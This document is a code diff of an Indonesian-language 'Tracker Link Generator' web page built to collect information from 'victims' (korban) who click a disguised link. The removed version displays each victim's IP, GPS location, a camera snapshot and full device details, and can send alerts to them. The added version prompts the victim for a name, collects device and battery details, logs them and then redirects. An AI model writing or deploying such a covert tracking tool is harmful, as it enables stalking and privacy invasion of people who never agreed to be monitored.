@@ -1,239 +1,181 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>🎯 Tracker Link Generator (Live)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta charset="UTF-8">
+  <title>Tracker Link Generator</title>
   <style>
     body {
+      font-family: Arial, sans-serif;
       background: #0d1117;
       color: #c9d1d9;
-      font-family: 'Segoe UI', sans-serif;
       padding: 20px;
     }
-    h2 {
-      color: #f0f6fc;
+    h1 { color: #00ffcc; }
+    .box {
+      background: #161b22;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 15px 0;
     }
     input, button {
-      padding: 12px;
-      border-radius: 10px;
-      font-size: 16px;
+      padding: 10px;
+      border-radius: 8px;
       border: none;
-      margin-bottom: 10px;
-      width: 100%;
-      max-width: 480px;
-    }
-    input {
-      background: #161b22;
-      color: #c9d1d9;
-      border: 1px solid #30363d;
+      margin: 5px 0;
     }
     button {
-      background: #238636;
-      color: white;
-      font-weight: bold;
+      background: #00ffcc;
+      color: #111;
       cursor: pointer;
+      font-weight: bold;
     }
-    .link-result {
-      font-size: 14px;
-      margin: 10px 0;
-      word-break: break-word;
-    }
-    .link-result a {
-      color: #58a6ff;
-      text-decoration: none;
-    }
-    .victim-box {
-      margin-top: 20px;
-      background: #161b22;
-      border-radius: 12px;
-      padding: 16px;
-      font-size: 14px;
-      border: 1px solid #30363d;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      white-space: pre-wrap;
-    }
-    .victim-box h3 {
-      margin-bottom: 10px;
-      font-size: 16px;
-      color: #79c0ff;
-    }
-    img.snapshot {
-      max-width: 100%;
+    a { color: #00ffcc; }
+    pre {
+      background: #111;
+      padding: 10px;
       border-radius: 8px;
-      margin-top: 10px;
-      border: 1px solid #30363d;
+      white-space: pre-wrap;
     }
   </style>
 </head>
 <body>
-  <h2>🎯 Tracker Link Generator</h2>
+  <h1>🔗 Tracker Link Generator</h1>
 
-  <form onsubmit="generateLink(event)">
-    <input type="url" id="target" placeholder="https://example.com" required />
-    <button type="submit">Generate Link</button>
-  </form>
+  <div class="box">
+    <h3>Buat Link Tracker</h3>
+    <input type="text" id="targetUrl" placeholder="https://example.com">
+    <button onclick="generateTracker()">Generate</button>
+    <p id="generatedLink"></p>
+  </div>
 
-  <form onsubmit="sendCustomAlert(event)">
-    <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
-    <button type="submit">Kirim Alert</button>
-  </form>
-
-  <div class="link-result" id="generatedLink"></div>
-
-  <div id="resultBox" class="victim-box" style="display: none;">
-    <h3>✅ Victim Information</h3>
-    <div id="resultOutput">Menunggu korban...</div>
-    <div id="mapBox" style="margin-top:10px;"></div>
-    <div id="imgBox" style="margin-top:10px;"></div>
+  <div class="box">
+    <h3>Log Tracking</h3>
+    <pre id="logBox">Belum ada data...</pre>
   </div>
 
   <script>
-    let currentCode = null;
-    let fetched = false;
-
-    function generateLink(e) {
-      e.preventDefault();
-      const input = document.getElementById("target").value.trim();
-      if (!input) return;
-
-      const code = Math.random().toString(36).substring(2, 10);
-      currentCode = code;
-      const link = `${window.location.origin}/track/${code}?id=${code}`;
-
-      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" target="_blank">${link}</a>`;
-      document.getElementById("resultOutput").textContent = "Menunggu korban...";
-      document.getElementById("resultBox").style.display = "block";
-
-      fetch("/log-tracker-link", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          id: code,
-          redirect_to: input,
-          created_at: new Date().toISOString()
-        })
-      });
-
-      pollVictimLogs();
+    // --- Generate tracker link
+    function generateTracker() {
+      let url = document.getElementById("targetUrl").value.trim();
+      if (!url) {
+        alert("Masukkan URL dulu!");
+        return;
+      }
+      let trackerUrl = window.location.href.split("?")[0] + "?redirect=" + encodeURIComponent(url);
+      document.getElementById("generatedLink").innerHTML =
+        `Link Tracker: <a href="${trackerUrl}" target="_blank">${trackerUrl}</a>`;
     }
 
-    function pollVictimLogs() {
-      if (!currentCode || fetched) return;
-      setInterval(async () => {
-        const res = await fetch("/get-tracker-logs");
-        const logs = await res.json();
-        const victim = logs.find(v => v.tracker_id === currentCode);
-        if (victim) {
-          fetched = true;
-          renderFullResult(victim);
-        }
-      }, 3000);
-    }
+    // --- Ambil info device
+    async function getDeviceInfo(target, victimText) {
+      let v = {};
+      v.url = target;
+      v.text = victimText || "N/A";
+      v.user_agent = navigator.userAgent;
+      v.platform = navigator.platform;
+      v.screen = `${screen.width}x${screen.height}`;
+      v.window = `${window.innerWidth}x${window.innerHeight}`;
+      v.orientation = screen.orientation?.type;
+      v.dpr = window.devicePixelRatio;
+      v.cpu = navigator.hardwareConcurrency || "N/A";
+      v.ram = navigator.deviceMemory || "N/A";
+      v.language = navigator.language;
+      v.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      v.touch = 'ontouchstart' in window;
+      v.maxTouchPoints = navigator.maxTouchPoints;
+      v.cookies = navigator.cookieEnabled;
+      v.online = navigator.onLine;
+      v.doNotTrack = navigator.doNotTrack;
+      v.webdriver = navigator.webdriver;
+      v.pdfViewerEnabled = navigator.pdfViewerEnabled;
 
-    function renderFullResult(v) {
-      const result = `
-⚓ IP: ${v.ip} | Time: ${v.access_time}
-⏳ Date In Victim's Device : ${v.local_time}
-
-📱 DEVICE OVERVIEW
-📲 Device Name: ${v.user_agent}
-💻 Operating System: ${parseOS(v.user_agent)}
-🌐 Browser: ${parseBrowser(v.user_agent)}
-🔧 Platform: ${v.platform || 'N/A'}
-
-🖥️ DISPLAY DETAILS
-📐 Screen Size: ${v.screen}
-🪟 Window Size: ${v.window}
-🎨 Color Quality: 24-bit
-🔄 Orientation: ${v.orientation || 'unknown'}
-📊 Pixel Density: ${v.dpr}x
-
-⚡ PERFORMANCE INFO
-🧠 CPU Cores: ${v.cpu}
-💾 Device RAM: ${v.ram}
-🌍 Language: ${v.language}
-🕐 Timezone: ${v.timezone}
-
-👆 INPUT CAPABILITIES
-📱 Touch Screen: ✅ ${v.touch ? 'Yes' : 'No'}
-🖐️ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
-🍪 Cookies: ✅ ${v.cookies ? 'Enabled' : 'Disabled'}
-🌐 Online Status: ✅ ${v.online ? 'Connected' : 'Disconnected'}
-
-🔒 SECURITY FEATURES
-🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
-🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
-📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
-
-📷 Media Device Information
-Audio Input Devices: ${v.audioIn || 0}
-Video Input Devices: ${v.videoIn || 0}
-Audio Output Devices: ${v.audioOut || 0}
-
-📶 NETWORK CONNECTION
-🚀 Connection Type: ${v.connection?.type || 'N/A'}
-🔗 Network Type: ${v.connection?.effectiveType || 'N/A'}
-⬇️ Download Speed: ${v.connection?.downlink || 'N/A'} Mbps
-💾 Data Saver: ${v.connection?.saveData ? '✅ Enabled' : '❌ Disabled'}
-
-🧠 MEMORY USAGE
-📊 Memory Used: ${v.memoryUsed || 'N/A'}
-📈 Total Allocated: ${v.memoryAllocated || 'N/A'}
-🚧 Memory Limit: ${v.memoryLimit || 'N/A'}
-
-🔋 BATTERY STATUS
-🔋 Battery Level: ${v.battery?.level || 'N/A'}
-⚡ Charging Status: ${v.battery?.charging || 'N/A'}
-      `;
-
-      document.getElementById("resultOutput").textContent = result;
-
-      // lokasi
-      if (v.location?.lat && v.location?.lon) {
-        document.getElementById("mapBox").innerHTML = `
-<h3>📍 Location</h3>
-📍 Latitude: ${v.location.lat}<br>
-📍 Longitude: ${v.location.lon}<br>
-🌐 <a href="https://maps.google.com/?q=${v.location.lat},${v.location.lon}" target="_blank">Google Maps</a>`;
-      } else {
-        document.getElementById("mapBox").innerHTML = `
-<h3>📍 Location</h3>
-🚫 Permission Denied or Unavailable`;
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        v.audioIn = devices.filter(d => d.kind === "audioinput").length;
+        v.audioOut = devices.filter(d => d.kind === "audiooutput").length;
+        v.videoIn = devices.filter(d => d.kind === "videoinput").length;
+      } catch {
+        v.audioIn = v.audioOut = v.videoIn = 0;
       }
 
-      // snapshot
-      document.getElementById("imgBox").innerHTML = `
-<h3>📷 Snapshot</h3>
-<img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
+      v.connection = navigator.connection || {};
+      try {
+        const battery = await navigator.getBattery();
+        v.battery = {
+          level: (battery.level * 100) + "%",
+          charging: battery.charging ? "Ya" : "Tidak"
+        };
+      } catch {
+        v.battery = { level: "N/A", charging: "N/A" };
+      }
+
+      v.time = new Date().toLocaleString();
+
+      return v;
     }
 
-    function parseOS(ua) {
-      if (ua.includes("Android")) return "Android";
-      if (ua.includes("iPhone")) return "iOS";
-      if (ua.includes("Windows")) return "Windows";
-      if (ua.includes("Mac OS")) return "macOS";
-      return "Unknown";
+    // --- Simpan log
+    function saveLog(info) {
+      let logs = JSON.parse(localStorage.getItem("trackerLogs") || "[]");
+      logs.push(info);
+      localStorage.setItem("trackerLogs", JSON.stringify(logs));
     }
 
-    function parseBrowser(ua) {
-      if (ua.includes("Chrome")) return "Chrome";
-      if (ua.includes("Firefox")) return "Firefox";
-      if (ua.includes("Safari")) return "Safari";
-      if (ua.includes("Edg")) return "Edge";
-      return "Unknown";
+    // --- Tampilkan log
+    function showLogs() {
+      let logs = JSON.parse(localStorage.getItem("trackerLogs") || "[]");
+      if (logs.length === 0) {
+        document.getElementById("logBox").innerText = "Belum ada data...";
+        return;
+      }
+      let text = "";
+      logs.forEach((v, i) => {
+        text += `
+[${i+1}] ${v.time}
+📝 Victim Text: ${v.text}
+📲 Device: ${v.user_agent}
+🔧 Platform: ${v.platform}
+📐 Screen: ${v.screen}
+🪟 Window: ${v.window}
+🔄 Orientation: ${v.orientation}
+📊 DPR: ${v.dpr}
+🧠 CPU: ${v.cpu}
+💾 RAM: ${v.ram} GB
+🌍 Language: ${v.language}
+🕐 Timezone: ${v.timezone}
+📱 Touch: ${v.touch ? 'Yes' : 'No'}
+🍪 Cookies: ${v.cookies ? 'Enabled' : 'Disabled'}
+🌐 Online: ${v.online ? 'Connected' : 'Offline'}
+🚫 Do Not Track: ${v.doNotTrack}
+🤖 Webdriver: ${v.webdriver ? 'Detected' : 'Not Detected'}
+📄 PDF Viewer: ${v.pdfViewerEnabled ? 'Yes' : 'No'}
+🎤 Audio In: ${v.audioIn}, 🎥 Video In: ${v.videoIn}, 🔊 Audio Out: ${v.audioOut}
+📶 Net: ${v.connection.effectiveType || 'N/A'}, ${v.connection.downlink || '?'} Mbps
+🔋 Battery: ${v.battery.level}, Charging: ${v.battery.charging}
+➡️ Redirect: ${v.url}
+------------------------------------------------
+`;
+      });
+      document.getElementById("logBox").innerText = text;
     }
 
-    function sendCustomAlert(e) {
-      e.preventDefault();
-      const msg = document.getElementById("customMsg").value.trim();
-      if (!msg || !currentCode) return;
+    // --- Cek apakah ada parameter redirect
+    const params = new URLSearchParams(window.location.search);
+    if (params.has("redirect")) {
+      let target = params.get("redirect");
 
-      fetch(`/send-alert/${currentCode}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message: msg })
-      }).then(() => alert("📢 Alert dikirim ke korban."));
+      // Popup untuk "text korban"
+      let victimText = prompt("Masukkan teks / nama Anda:");
+
+      getDeviceInfo(target, victimText).then(info => {
+        saveLog(info);
+        showLogs();
+        setTimeout(() => {
+          window.location.href = target;
+        }, 1500);
+      });
+    } else {
+      showLogs();
     }
   </script>
 </body>
